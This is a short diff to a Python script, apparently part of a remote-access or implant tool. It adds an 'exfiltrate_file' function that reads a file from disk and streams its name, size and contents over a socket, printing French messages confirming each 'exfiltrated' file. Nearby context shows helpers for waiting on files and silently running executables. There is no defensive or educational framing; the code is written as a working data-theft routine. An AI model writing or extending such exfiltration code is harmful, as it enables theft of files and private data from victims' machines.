@@ -121,6 +121,25 @@ def wait_for_file(file_path, timeout=10):
         time.sleep(1)
     return True
 
+
+def exfiltrate_file(file_path, sock):
+    try:
+        filename = os.path.basename(file_path)
+        filesize = os.path.getsize(file_path)
+        header = f"exfil:{filename}:{filesize}".encode().ljust(128)
+        sock.sendall(header)
+
+        with open(file_path, "rb") as f:
+            while True:
+                chunk = f.read(4096)
+                if not chunk:
+                    break
+                sock.sendall(chunk)
+        print(f"[+] Fichier exfiltré : {file_path}")
+    except Exception as e:
+        print(f"[!] Erreur exfiltration : {e}")
+
+        
 # Lancer un exécutable si présent
 def safe_run(exe_path, args=None, silent=False):
     if exe_path and os.path.exists(exe_path):
